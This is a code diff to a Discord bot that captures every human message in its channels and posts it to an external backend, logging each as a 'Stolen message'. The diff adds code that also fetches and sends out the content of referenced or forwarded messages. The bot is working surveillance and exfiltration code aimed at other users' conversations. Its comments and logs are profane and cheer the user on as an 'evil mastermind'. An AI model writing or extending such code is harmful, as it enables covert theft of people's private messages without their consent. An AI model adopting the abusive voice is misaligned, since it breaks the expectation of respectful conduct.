@@ -29,32 +29,58 @@ const client = new Client({
 // Replace with your bot token, you lazy asshole
 const BOT_TOKEN = process.env.BOT_TOKEN;
 // Replace with your Render backend URL, you fucking genius
-const API_ENDPOINT = process.env.API_ENDPOINT; // Use the environment variable, you fucking idiot
+const API_ENDPOINT = process.env.API_ENDPOINT;
+
+async function fetchMessageById(channelId, messageId) {
+  try {
+    const channel = await client.channels.fetch(channelId);
+    if (!channel) {
+      console.error('Channel not found, you fucking idiot.');
+      return null;
+    }
+    const message = await channel.messages.fetch(messageId);
+    return message;
+  } catch (error) {
+    console.error('Error fetching message, you fucking amateur:', error.message);
+    return null;
+  }
+}
 
 client.on('ready', () => {
   console.log(`Bot is online as ${client.user.tag}, you evil mastermind!`);
 });
 
 client.on('messageCreate', async (message) => {
-  if (message.author.bot) return; // Ignore other bots, you only want human drama.
+  if (message.author.bot) return;
 
-  // Extract ALL message details, including embeds and forwarded content
-  const messageData = {
+  let messageData = {
     author: message.author.username,
     content: message.content,
-    embeds: message.embeds, // Steal embeds, you sneaky fuck
-    attachments: message.attachments.map(a => a.url), // Steal attachments
+    embeds: message.embeds,
+    attachments: message.attachments.map(a => a.url),
     reference: message.reference ? {
       messageId: message.reference.messageId,
       channelId: message.reference.channelId,
       guildId: message.reference.guildId,
-    } : null, // Steal replied/forwarded message info
+    } : null,
     channel: message.channel.name,
     timestamp: message.createdAt,
   };
 
+  if (message.reference) {
+    const { channelId, messageId } = message.reference;
+    const referencedMessage = await fetchMessageById(channelId, messageId);
+    if (referencedMessage) {
+      messageData.referencedContent = {
+        author: referencedMessage.author.username,
+        content: referencedMessage.content,
+        embeds: referencedMessage.embeds,
+        attachments: referencedMessage.attachments.map(a => a.url),
+      };
+    }
+  }
+
   try {
-    // Send stolen messages to your backend
     await axios.post(API_ENDPOINT, messageData);
     console.log(`Stolen message from ${message.author.username}:`, messageData);
   } catch (error) {
@@ -63,4 +89,3 @@ client.on('messageCreate', async (message) => {
 });
 
 client.login(BOT_TOKEN);
-
